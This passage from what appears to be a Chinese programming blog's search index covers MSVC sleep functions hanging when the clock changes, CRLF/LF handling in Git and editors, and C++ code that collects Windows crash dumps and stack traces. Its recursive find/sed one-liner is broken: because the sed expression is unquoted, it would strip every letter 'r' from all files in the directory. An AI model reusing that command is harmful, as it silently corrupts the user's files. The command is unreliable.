href=\"https://en.cppreference.com/w/cpp/chrono/system_clock\">https://en.cppreference.com/w/cpp/chrono/system_clock</a></p>\n</li>\n</ol>\n<blockquote>\n<p>请注意，这些文档是针对C++标准库的，因此不会涉及到特定操作系统或编译器的实现细节。如果您需要了解特定平台上的实现，请查阅相应平台的文档。</p>\n</blockquote>\n<p>C++官方文档将<code>std::chrono::steady_clock</code>定义为一个单调（monotonic）时钟，它不会随着修改时间而改变，而是一直稳定增加，可以理解为开机起到当前的时间。<code>std::chrono::system_clock</code>则是系统时钟，随着用户修改时间而修改。对于可能涉及用户修改时间的场景官方建议使用<code>std::chrono::steady_clock</code>，所以从直觉上看<code>std::chrono::sleep_for</code>和<code>std::chrono::sleep_util</code>应当基于<code>std::chrono::steady_clock</code>实现。</p>\n<p>实际情况是：通过分析VS2017上MSVC的STL代码，可以发现的确相关实现用到了<code>std::chrono::system_clock::now()</code>。经测试VS2017的环境上<code>std::chrono::sleep_for</code>在向前/后拨动时钟都会卡住，<code>std::chrono::sleep_util</code>则是往前拨动时钟卡住。而VS2020的<code>std::chrono::sleep_for</code>和<code>std::chrono::sleep_util</code>往后拨动时钟不再卡住，而往前拨动时钟依然卡住。看到相关论坛对该BUG的上报：<a href=\"https://developercommunity.visualstudio.com/t/this-threadsleep-for-hangs-when-system-clock-moved/169569\">https://developercommunity.visualstudio.com/t/this-threadsleep-for-hangs-when-system-clock-moved/169569</a>。其中VS2020上改BUG的上报：<a href=\"https://github.com/microsoft/STL/issues/718\">https://github.com/microsoft/STL/issues/718</a>，似乎并未得到解决。</p>\n<p>所以要解决不同编译器版本下Windows下sleep的系统时钟拨动问题，最好还是用上文说的<code>std::chrono::steady_clock::now()</code>配合<code>std::this_thread::yield()</code>实现自己的sleep函数，或者用Windows API：<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep\">Sleep()</a></p>\n","tags":["CPP"]},{"title":"解决CRLF和LF的冲突","url":"/2022/07/09/%E8%A7%A3%E5%86%B3CRLF%E5%92%8CLF%E7%9A%84%E5%86%B2%E7%AA%81/","content":"<h2 id=\"CRLF和LF\"><a href=\"#CRLF和LF\" class=\"headerlink\" title=\"CRLF和LF\"></a>CRLF和LF</h2><p>重视由于历史的原因，各种不同的操作系统在处理行尾结束符采取了不同的处理方法：</p>\n<ul>\n<li>CRLF(carriage return line feed)，即“回车换行”，是Windows下的文件换行符<code>\\r\\n</code></li>\n<li>LF(line feed)，即“换行”，是类Unix下的文件换行符<code>\\n</code></li>\n<li>CR(carriage return)，即“回车”，是Mac OS下的文件换行符<code>\\r</code>（现在Mac OS X下已经改回LF）</li>\n</ul>\n<p>关于产生CRLF和LF的历史原因可以看这篇文章：<a href=\"https://zhuanlan.zhihu.com/p/380574688\">CRLF和LF的差异</a></p>\n<span id=\"more\"></span>\n<h2 id=\"配置编辑器eol\"><a href=\"#配置编辑器eol\" class=\"headerlink\" title=\"配置编辑器eol\"></a>配置编辑器eol</h2><p>CRLF冲突导致最直接的问题就是Windows上写的Shell脚本无法在Linux上运行。由于Windows上编写的Shell脚本以CRLF换行，Linux上无法正确识别换行符，于是会一直报告语法错误。</p>\n<p>临时解决办法则是批量替换CRLF为LF：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">!<span class=\"comment\">#/bin/bash</span></span><br><span class=\"line\">find . -<span class=\"built_in\">type</span> f -print0 | xargs -0 sed -i s/\\r//g </span><br></pre></td></tr></table></figure></p>\n<p>但最终的解决办法还是要配置编辑器的换行规则(eol)：。</p>\n<p>例如：VSCode：右下角会显示当前文本的换行规则，建议一个开发团队里统一采用LF作为换行规则。<br><img src=\"Screenshot_20220709_153029.png\" alt=\"\"></p>\n<p>在<code>File</code>、<code>Preference</code>、<code>Setting</code>中搜索<code>files.eol</code>，设置为<code>\\n</code><br><img src=\"Screenshot_20220709_152959.png\" alt=\"\"></p>\n<h2 id=\"Git配置CRLF和LF转换规则\"><a href=\"#Git配置CRLF和LF转换规则\" class=\"headerlink\" title=\"Git配置CRLF和LF转换规则\"></a>Git配置CRLF和LF转换规则</h2><p>Git对换行符敏感，需要以来换行来比对文本差异，为了兼容CRLF和LF提供了如下配置：<code>git config --global core.autocrlf [true|false|input]</code></p>\n<p>Git为了解决上面提出的问题，会自动对换行符进行转换，转换的方案有三种：</p>\n<ol>\n<li><code>git config --global core.autocrlf true</code> 在提交的时候将CRLF转换为LF，在拉取（检出checkout）代码时将LF转换为CRLF。（这种方案在Windows系统中默认，在提交时Git会给出警告，告知CRLF被转为了LF）</li>\n<li><code>git config --global core.autocrlf input</code> 在提交的时候将CRLF转换为LF，在拉取（检出checkout）代码时不进行转换。（在类Unix操作系统中默认）</li>\n<li><code>git config --global core.autocrlf false</code> 不进行任何的转换（这种方案在跨平台的团队协作中，不推荐使用）</li>\n</ol>\n<p>可以发现，如果不使用第三种方案，<strong>在Git仓库（包括本地和远程仓库）中保存的换行符都是默认使用LF表示的</strong>。</p>\n<p>一般在项目中，为了避免项目同时出现CRLF和LF，还可以开启Git的safecrlf检查。有如下几种配置可选：</p>\n<ol>\n<li><code>git config --global core.safecrlf true</code> 拒绝提交包含混合换行符的文件 (一般设置为true)</li>\n<li><code>git config --global core.safecrlf false</code> 允许提交包含混合换行符的文件</li>\n<li><code>git config --global core.safecrlf warn</code> 提交包含混合换行符的文件时给出警告</li>\n</ol>\n<p>为了避免在每个开发人员的电脑上都依据操作系统和编辑器去做如上配置，可以将配置放在项目中的<code>.gitattributes</code>中，它只针对一个单一的仓库。</p>\n<ol>\n<li><code>text=auto</code>：采用Git认为最好的方式来处理文件的换行符，在<code>.gitattributes</code>中的默认配置项是按照这种方式处理的。(如果是文本文件，则在文件入Git库时，行尾自动转换为LF。如果已经在入Git库中的文件的行尾是CRLF，则文件在入Git库时，不再转换为LF。)</li>\n<li><code>-text</code>：表示让git在checkin以及checkout的时候，对end-of-line不做任何转换。</li>\n<li><code>text</code>：表示在checkin的时候会被转换为LF（在repository中的文件结束符是LF），如果需要控制在checkout的时候的换行符，需要结合eol进行设置（也就是控制working tree中的文件的结尾符，需要通过eol设置）。<code>text=auto</code>和<code>text</code>的区别在于，<code>text=auto</code>由Git来确定是不是文本文件，从而进行转换；而<code>text</code>表示，你确定这个path就是文本文件，会直接对这个path进行转换，而不是有Git来决定是否转换。如果没有指定<code>text</code>，git会使用全局配置中的<code>core.autocrlf</code>来进行eol的转换。<code>core.autocrlf</code>需要自己在自己的电脑上进行配置。</li>\n<li><code>eol=crlf</code>：对左边匹配的文件统一使用CRLF换行符格式，如果有文件中出现LF将会转换成CRLF;也就是说，在checkin和checkout的时候，文件中都是CRLF，LF会被转换为CRLF。</li>\n<li><code>eol=lf</code> ：对左边匹配的文件统一使用LF换行符格式，如果有文件中出现CRLF将会转换成LF;也就是说，在checkin和checkout的时候，文件中都是LF，CRLF会被转换为LF。</li>\n<li><code>binary</code> : 告诉Git该文件为二进制，防止Git修改该文件。Git不会对其中的换行符进行改变。</li>\n</ol>\n<p>示例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Set the default behavior, in case people don&#x27;t have core.autocrlf set.</span><br><span class=\"line\">* text=auto</span><br><span class=\"line\"></span><br><span class=\"line\"># Explicitly declare text files you want to always be normalized and converted</span><br><span class=\"line\"># to native line endings on checkout.</span><br><span class=\"line\">*.c text</span><br><span class=\"line\">*.h text</span><br><span class=\"line\"></span><br><span class=\"line\"># Declare files that will always have CRLF line endings on checkout.</span><br><span class=\"line\">*.sln text eol=crlf</span><br><span class=\"line\"></span><br><span class=\"line\"># Denote all files that are truly binary and should not be modified.</span><br><span class=\"line\">*.png binary</span><br><span class=\"line\">*.jpg binary</span><br></pre></td></tr></table></figure></p>\n","tags":["Git"]},{"title":"记录程序的崩溃","url":"/2023/03/21/%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B4%A9%E6%BA%83/","content":"<h2 id=\"Windows捕获Crash\"><a href=\"#Windows捕获Crash\" class=\"headerlink\" title=\"Windows捕获Crash\"></a>Windows捕获Crash</h2><p>打开<code>regedit.exe</code>在注册表中找到<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting</code><br>项，新建3个“字符串值”：配置<code>DumpCount = 10</code>，<code>DumpFolder = C:\\XUranusDump</code>，<code>DumpType = 2</code>如图所示：</p>\n<p><img src=\"regedit.png\" alt=\"\"></p>\n<p>其中DumpType代表的含义是：</p>\n<ul>\n<li>0 ：Create a Custom Dump  </li>\n<li>1 ：Mini Dump  </li>\n<li>2 ：Full Dump  </li>\n</ul>\n<p>这里配置将会在程序崩溃时在<code>C:\\XUranusDump</code>目录下生成完整的Dump信息，最多生成10个。生成的Dump信息以<code>*.dmp</code>文件形式存在：</p>\n<span id=\"more\"></span>\n<p><img src=\"dump.png\" alt=\"\"></p>\n<p>有了<code>*.dmp</code>文件就可以用VS调试Dump。调试会依赖可执行程序及对应的<code>*.pdb</code>符号文件。如果是本地执行产生的<code>*.dmp</code>文件，VS可以直接从<code>*.dmp</code>文件拿到<code>*.pdb</code>的位置，如果是其他环境生成的<code>*.dmp</code>文件在本地调试，需要在VS中指定符号文件和源码<br>的路径，将源码、<code>*.pdb</code>和<code>*.dmp</code>文件放在同一目录下。</p>\n<blockquote>\n<p><code>*.pdb</code>文件和可执行程序的构建是一一对应的，即：<strong>同样的源码两次构建产生的pdb不一样</strong>。因此必须在生成每一个Release后保存好对应的<code>*.pdb</code>文件以供日后调试。</p>\n</blockquote>\n<p>在生产环境上，可以在用户程序中捕获异常并生成MiniDump文件。</p>\n<p>Windows提供<code>SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER* handler)</code> API用于注册一个异常捕获函数：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Register windows crash handler</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> LONG <span class=\"title\">ApplicationCrashCollector</span><span class=\"params\">(EXCEPTION_POINTERS *pException)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Handle Exception via pException ptr here ...</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>通过<code>EXCEPTION_POINTERS* pException</code>可以拿到异常相关信息，并生成MiniDump文件。我们来实现一个<code>DumpCollector</code>来实现上述功能：</p>\n<blockquote>\n<p>完整代码详见：<a href=\"https://github.com/XUranus/MiniDump\">MiniDump</a></p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DumpCollector</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"comment\">// init collector, need to be called at main routine</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span>                         <span class=\"title\">Init</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> WIN32</span></span><br><span class=\"line\">    <span class=\"comment\">// specify root path of dump file</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">bool</span>                         <span class=\"title\">SetDumpFileRoot</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; dumpFileRootPath)</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> WIN32</span></span><br><span class=\"line\">    <span class=\"comment\">// util method, to generate a dump file path contain current datetime</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> std::string                  <span class=\"title\">GenerateDumpFilePath</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// collect summary reason of win32 exception</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> std::string                  <span class=\"title\">GetWin32ExceptionInfo</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// generate detail info of stack trace (windows)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> std::vector&lt;StackFrame&gt;      <span class=\"title\">DumpWin32StackTrace</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// genterate a *.dmp file at target path, will return empty if failed</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> std::string                  <span class=\"title\">CreateDumpFile</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> WIN32</span></span><br><span class=\"line\">    <span class=\"comment\">// store ptr of EXCEPTION_POINTER of exception caught</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">void</span>*            exceptionPtr;</span><br><span class=\"line\">    <span class=\"comment\">// store the dump file root path specified</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> std::string      dumpFileRootPath;</span><br><span class=\"line\">    <span class=\"comment\">// callback function (dump path, crash cause, stacktrace)</span></span><br><span class=\"line\">    <span class=\"keyword\">using</span> WinCallbackType = <span class=\"built_in\"><span class=\"keyword\">void</span></span>(<span class=\"keyword\">const</span> std::string&amp;, <span class=\"keyword\">const</span> std::string&amp;, <span class=\"keyword\">const</span> std::vector&lt;StackFrame&gt;&amp; frames);</span><br><span class=\"line\">    <span class=\"keyword\">static</span> std::function&lt;WinCallbackType&gt; Win32CrashHandler;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>在<code>DumpCollector::Init</code>中注册异常处理函数<code>ApplicationCrashCollector</code>，在<code>ApplicationCrashCollector</code>中处理<code>EXCEPTION_POINTERS *pException</code>，依次调用：</p>\n<ol>\n<li><code>DumpCollector::CreateDumpFile()</code> 生成MiniDump文件</li>\n<li><code>DumpCollector::GetWin32ExceptionInfo()</code>获取异常信息</li>\n<li><code>DumpCollector::DumpWin32StackTrace()</code>获取当前堆栈</li>\n<li><p><code>DumpCollector::Win32CrashHandler()</code>通过注册的回调函数返回MiniDump路径、异常原因、堆栈</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Register windows crash handler</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> LONG <span class=\"title\">ApplicationCrashCollector</span><span class=\"params\">(EXCEPTION_POINTERS *pException)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// set exception pointer</span></span><br><span class=\"line\">    DumpCollector::exceptionPtr = <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">void</span>*&gt;(pException);</span><br><span class=\"line\">    <span class=\"comment\">// prepare to collect dump info</span></span><br><span class=\"line\">    std::string dumpFilePath = DumpCollector::<span class=\"built_in\">CreateDumpFile</span>();</span><br><span class=\"line\">    std::string exceptionCause = DumpCollector::<span class=\"built_in\">GetWin32ExceptionInfo</span>();</span><br><span class=\"line\">    std::vector&lt;StackFrame&gt; stacktrace = DumpCollector::<span class=\"built_in\">DumpWin32StackTrace</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (DumpCollector::Win32CrashHandler == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;missing win32 crash handler&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        DumpCollector::<span class=\"built_in\">Win32CrashHandler</span>(dumpFilePath, exceptionCause, stacktrace);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DumpCollector::Init</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> WIN32</span></span><br><span class=\"line\">    ::<span class=\"built_in\">SetUnhandledExceptionFilter</span>((LPTOP_LEVEL_EXCEPTION_FILTER)ApplicationCrashCollector);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用<code>MiniDumpWriteDump()</code>从<code>EXCEPTION_POINTERS* pException</code>生成MiniDump文件：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Create dump file from DumpCollector::exceptionPtr</span></span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">DumpCollector::CreateDumpFile</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (DumpCollector::exceptionPtr == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;failed to create dump file, exception ptr is null&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::string dumpFilePath = DumpCollector::<span class=\"built_in\">GenerateDumpFilePath</span>();</span><br><span class=\"line\">    EXCEPTION_POINTERS *pException = <span class=\"keyword\">static_cast</span>&lt;EXCEPTION_POINTERS*&gt;(DumpCollector::exceptionPtr);</span><br><span class=\"line\">    std::wstring wDumpFilePath = <span class=\"built_in\">Utf8ToUtf16</span>(dumpFilePath);</span><br><span class=\"line\">    HANDLE hDumpFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        wDumpFilePath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_WRITE,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        CREATE_ALWAYS,</span><br><span class=\"line\">        FILE_ATTRIBUTE_NORMAL,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hDumpFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>; <span class=\"comment\">// failed to create file</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// fill dump information  </span></span><br><span class=\"line\">    MINIDUMP_EXCEPTION_INFORMATION dumpInfo;  </span><br><span class=\"line\">    dumpInfo.ExceptionPointers = pException;  </span><br><span class=\"line\">    dumpInfo.ThreadId = ::<span class=\"built_in\">GetCurrentThreadId</span>();</span><br><span class=\"line\">    dumpInfo.ClientPointers = TRUE;</span><br><span class=\"line\">    <span class=\"comment\">// write dump information to file</span></span><br><span class=\"line\">    ::<span class=\"built_in\">MiniDumpWriteDump</span>(</span><br><span class=\"line\">        ::<span class=\"built_in\">GetCurrentProcess</span>(),</span><br><span class=\"line\">        ::<span class=\"built_in\">GetCurrentProcessId</span>(),</span><br><span class=\"line\">        hDumpFile,</span><br><span class=\"line\">        MiniDumpNormal,</span><br><span class=\"line\">        &amp;dumpInfo,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hDumpFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dumpFilePath;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>从<code>pException-&gt;ExceptionRecord-&gt;ExceptionCode</code>枚举错误码，获取异常原因：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> CASE_RETURN(EXCEPTION) case EXCEPTION: &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">    return #EXCEPTION; \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125; \\</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"comment\">// obtain exception reason from pException</span></span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">DumpCollector::GetWin32ExceptionInfo</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    EXCEPTION_POINTERS* exceptionPtr = <span class=\"keyword\">static_cast</span>&lt;EXCEPTION_POINTERS*&gt;(DumpCollector::exceptionPtr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (exceptionPtr == <span class=\"literal\">nullptr</span> || exceptionPtr-&gt;ExceptionRecord == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (exceptionPtr-&gt;ExceptionRecord-&gt;ExceptionCode) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_ACCESS_VIOLATION)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_ARRAY_BOUNDS_EXCEEDED)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_BREAKPOINT)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_DATATYPE_MISALIGNMENT)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_DENORMAL_OPERAND)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_DIVIDE_BY_ZERO)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_INEXACT_RESULT)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_INVALID_OPERATION)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_OVERFLOW)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_STACK_CHECK)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_FLT_UNDERFLOW)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_ILLEGAL_INSTRUCTION)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_IN_PAGE_ERROR)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_INT_OVERFLOW)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_INVALID_DISPOSITION)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_NONCONTINUABLE_EXCEPTION)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_PRIV_INSTRUCTION)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_SINGLE_STEP)</span><br><span class=\"line\">        <span class=\"built_in\">CASE_RETURN</span>(EXCEPTION_STACK_OVERFLOW)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Unknown Exception&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>从<code>EXCEPTION_POINTERS* pException</code>获取堆栈信息：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">StackFrame</span> &#123;</span></span><br><span class=\"line\">    std::string         file;</span><br><span class=\"line\">    std::string         <span class=\"keyword\">module</span>;</span><br><span class=\"line\">    std::string         function;</span><br><span class=\"line\">    <span class=\"keyword\">uint64_t</span>            address;</span><br><span class=\"line\">    <span class=\"keyword\">uint64_t</span>            line;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// a util function to reduce complexity of DumpWin32StackTrace</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> std::vector&lt;StackFrame&gt; <span class=\"title\">WalkStacks</span><span class=\"params\">(DWORD machineType, HANDLE hProcess, HANDLE hThread, STACKFRAME* stackframePtr, CONTEXT* contextPtr)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> first = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    std::vector&lt;StackFrame&gt; stackframes;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (::<span class=\"built_in\">StackWalk</span>(machineType, hProcess, hThread, stackframePtr, contextPtr, <span class=\"literal\">nullptr</span>, SymFunctionTableAccess, SymGetModuleBase, <span class=\"literal\">nullptr</span>)) &#123;</span><br><span class=\"line\">        StackFrame f&#123;&#125;;</span><br><span class=\"line\">        f.address = stackframePtr-&gt;AddrPC.Offset;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> _WIN64</span></span><br><span class=\"line\">        DWORD64 moduleBase = <span class=\"built_in\">SymGetModuleBase</span>(hProcess, stackframePtr-&gt;AddrPC.Offset);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">        DWORD moduleBase = <span class=\"built_in\">SymGetModuleBase</span>(hProcess, stackframePtr-&gt;AddrPC.Offset);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">        <span class=\"keyword\">char</span> moduelBuff[MAX_PATH];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (moduleBase &amp;&amp; <span class=\"built_in\">GetModuleFileNameA</span>((HINSTANCE)moduleBase, moduelBuff, MAX_PATH)) &#123;</span><br><span class=\"line\">            f.<span class=\"keyword\">module</span> = moduelBuff;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> _WIN64</span></span><br><span class=\"line\">        DWORD64 offset = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">        DWORD offset = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">        <span class=\"keyword\">char</span> symbolBuffer[<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(IMAGEHLP_SYMBOL) + <span class=\"number\">255</span>];</span><br><span class=\"line\">        PIMAGEHLP_SYMBOL symbol = (PIMAGEHLP_SYMBOL)symbolBuffer;</span><br><span class=\"line\">        symbol-&gt;SizeOfStruct = (<span class=\"keyword\">sizeof</span> IMAGEHLP_SYMBOL) + <span class=\"number\">255</span>;</span><br><span class=\"line\">        symbol-&gt;MaxNameLength = <span class=\"number\">254</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (::<span class=\"built_in\">SymGetSymFromAddr</span>(hProcess, stackframePtr-&gt;AddrPC.Offset, &amp;offset, symbol)) &#123;</span><br><span class=\"line\">            f.function = symbol-&gt;Name;</span><br><span class=\"line\">        &#125; <span class=\"comment\">// Failed to resolve address frame.AddrPC.Offset otherwise, default empty</span></span><br><span class=\"line\"></span><br><span class=\"line\">        IMAGEHLP_LINE line;</span><br><span class=\"line\">        line.SizeOfStruct = <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(IMAGEHLP_LINE);</span><br><span class=\"line\"></span><br><span class=\"line\">        DWORD offsetln = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (::<span class=\"built_in\">SymGetLineFromAddr</span>(hProcess, stackframePtr-&gt;AddrPC.Offset, &amp;offsetln, &amp;line)) &#123;</span><br><span class=\"line\">            f.file = line.FileName;</span><br><span class=\"line\">            f.line = line.LineNumber;</span><br><span class=\"line\">        &#125; <span class=\"comment\">// Failed to resolve line for frame.AddrPC.Offset otherwise, default 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!first) &#123;</span><br><span class=\"line\">            stackframes.<span class=\"built_in\">push_back</span>(f);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        first = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> stackframes;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::vector&lt;StackFrame&gt; <span class=\"title\">DumpCollector::DumpWin32StackTrace</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span 